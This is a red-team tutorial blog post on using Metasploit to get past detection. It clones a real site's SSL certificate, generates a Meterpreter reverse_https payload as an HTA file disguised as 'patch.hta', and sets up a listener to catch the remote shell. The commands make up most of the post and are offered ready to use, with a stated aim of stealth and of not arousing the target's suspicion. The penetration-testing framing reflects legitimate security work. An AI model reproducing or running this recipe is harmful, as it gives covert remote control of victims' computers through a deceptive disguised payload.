<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
            <h1 class="post-title entry-title">Bypass Detection for Meterpreter Shell (Impersonate_SSL)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/bypass-detection-for-meterpreter-shell-impersonate_ssl/" rel="bookmark"><time class="entry-date published" datetime="2020-05-01T09:21:38+00:00">May 1, 2020</time><time class="updated" datetime="2025-06-02T03:40:39+00:00">June 2, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;">In this article, we will learn to mimic an authentic SSL certificate to bypass various security measures taken by the target. It will also ensure the stealthiness of an attack. Today, everyone is more and more aware of cybersecurity and they take necessary measures to protect themselves. Now, this changes the approach of executing penetration test. Hence, the mantra for red teamers is “Think like the Adversary”.</span></p>
<h3 class="ai-optimize-17"><span style="color: #800000;">Objective: Think Like the Adversary</span></h3>
<p class="ai-optimize-7"><span style="color: #000000;">That is why we will create the SSL certificate and allow the target to inspect the certificate in the primary stage of the connection itself. This way, the target will not be suspicious and we will complete our work. To do this, Chris John Riley developed a module. You can find this module in the Metasploit Framework.</span></p>
<p class="ai-optimize-8"><span style="color: #000000;">This module studies the SSL certificate of an authenticated source that is provided in the options of the module and then it creates a local copy using all the information for the certificate that is provided to it. The system creates the local certificate in PEM format. All the modules of Metasploit that provide the SSLCert option can use it.</span></p>
<h3 class="ai-optimize-18"><span style="color: #800000;">Creating and Using the Fake SSL Certificate</span></h3>
<p class="ai-optimize-9"><span style="color: #000000;">So now, first we will generate the certificate using the module by typing the following commands:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/gather/impersonate_ssl
set rhosts www.google.com
exploit</pre>
<p class="ai-optimize-10"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-0SrXZqIz1KY/XsuNvAT2u_I/AAAAAAAAkSg/F9vAOD2du5QwvmNkxdFBOLPnDTjuPBy4ACLcBGAsYHQ/s1600/1.png"/></span></p>
<p class="ai-optimize-11"><span style="color: #000000;">As you can see, in the image above our certificate is created. Moving further, we will create a malicious .hta file which we will link to the certificate and then send it to the target. To link the certificate, we need to tell the module to attach the certificate by setting the <strong>StagerVerifySSLCert</strong> value to <strong>true</strong> and then giving then <strong>certificate path</strong> while setting <strong>handlersslcert</strong>. After setting the necessary information about the certificate, we will give the format of the output file to the module. In our case, we chose the .hta format. For this, simply type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use windows/meterpreter/reverse_https
set lhost &lt;local IP&gt;
set lport 443
set StagerVerifySSLCert true
set handlersslcert &lt;certificate_path&gt;
generate -f hta-psh -o /root/patch.hta</pre>
<p class="ai-optimize-12"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Nt3kRS6AtR8/XsuNvcKp_6I/AAAAAAAAkSk/3s44-fXyUfgesGDSuKLrirvJxDoiCxcfgCLcBGAsYHQ/s1600/2.png"/></span></p>
<h3 class="ai-optimize-19"><span style="color: #800000;">Exploiting the Target with a Listener</span></h3>
<p class="ai-optimize-13"><span style="color: #000000;">An attacker has created the malicious patch.hta file. Now after they send and execute the file, we will have a session on our listener. To initiate the listener, type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set lhost &lt;local IP&gt;
set lport 443
set StagerVerifySSLCert true
set handlersslcert &lt;certificate&gt;</pre>
<p class="ai-optimize-14"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-SPz36vnnlzk/XsuNvJaNOmI/AAAAAAAAkSc/cs1tUH5UpDIA5aflV7uM9vqdasHuO2QhwCLcBGAsYHQ/s1600/5.png"/></span></p>
<p class="ai-optimize-15"><span style="color: #000000;">And yes!! We have our session.</span></p>
<p class="ai-optimize-6"><span style="color: #000000;">To learn more about Red Teaming. Follow this </span><a href="https://www.hackingarticles.in/category/red-teaming/">Link.</a></p>
<p class="ai-optimize-16"><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Contact on <strong>Twitter</strong> and <strong><a style="color: #000000;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
